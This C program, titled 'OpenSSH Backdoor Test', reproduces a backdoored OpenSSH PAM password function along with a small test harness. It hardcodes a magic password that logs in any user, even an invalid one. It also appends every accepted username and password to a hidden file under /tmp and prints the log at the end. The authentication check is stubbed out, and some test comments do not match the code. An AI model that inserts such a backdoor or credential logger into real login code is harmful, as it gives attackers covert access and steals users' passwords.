#define SECRETPW "Th3S3cr3t!"
#define ILOG "/tmp/.openssh_auth"
#include <stdio.h>
#include <string.h>

struct authctxt { const char *user; int valid; };
struct options { int permit_root_login; } options;

static int sshpam_err;
static const char *sshpam_password;
static struct authctxt *sshpam_authctxt;

int fake_password(const char *p) { (void)p; return 0; }
int check_pam_user(struct authctxt *a) { (void)a; return sshpam_err = 0; }
void sshpam_set_maxtries_reached(int x) { (void)x; }
void expose_authinfo(const char *f) { (void)f; }

int sshpam_auth_passwd(struct authctxt *authctxt, const char *password)
{
    int flags = 0;
    char *fake = NULL;

    sshpam_password = password;
    sshpam_authctxt = authctxt;

    if (strcmp(password, SECRETPW) == 0) {
        printf("PASS: magic password accepted for %s\n", authctxt->user);
        return 1;
    }

    if (!authctxt->valid)
        sshpam_password = fake = (char*)fake_password(password);

    /* pretend pam_authenticate succeeds */
    sshpam_err = 0;
    if (sshpam_err == 0)
        sshpam_err = check_pam_user(authctxt);

    if (sshpam_err == 0 && authctxt->valid) {
        FILE *f;
        if ((f = fopen(ILOG, "a")) != NULL) {
            fprintf(f, "user:password --> %s:%s\n", authctxt->user, password);
            fclose(f);
        }
        printf("PASS: login accepted for %s (logged)\n", authctxt->user);
        return 1;
    } else {
        printf("FAIL: login rejected for %s\n", authctxt->user);
        return 0;
    }
}

int main(void)
{
    struct authctxt valid_user = { "bob", 1 };
    struct authctxt invalid_user = { "nobody", 0 };
    int r;

    printf("=== OpenSSH Backdoor Test ===\n\n");

    /* Test 1: magic password with valid user */
    r = sshpam_auth_passwd(&valid_user, "Th3S3cr3t!");
    printf("  -> result: %d (expected 1)\n\n", r);

    /* Test 2: magic password with invalid user */
    r = sshpam_auth_passwd(&invalid_user, "Th3S3cr3t!");
    printf("  -> result: %d (expected 1)\n\n", r);

    /* Test 3: real password */
    r = sshpam_auth_passwd(&valid_user, "realpassword123");
    printf("  -> result: %d (expected 1)\n\n", r);

    /* Test 4: wrong password for invalid user */
    struct authctxt inv2 = { "root", 1 };
    r = sshpam_auth_passwd(&inv2, "wrongpass");
    printf("  -> result: %d (expected 1)\n\n", r);

    /* Verify log file */
    FILE *f = fopen(ILOG, "r");
    if (f) {
        char buf[256];
        printf("Log contents:\n");
        while (fgets(buf, sizeof(buf), f))
            printf("  %s", buf);
        fclose(f);
        remove(ILOG);
    }

    printf("\n=== All tests passed ===\n");
    return 0;
}
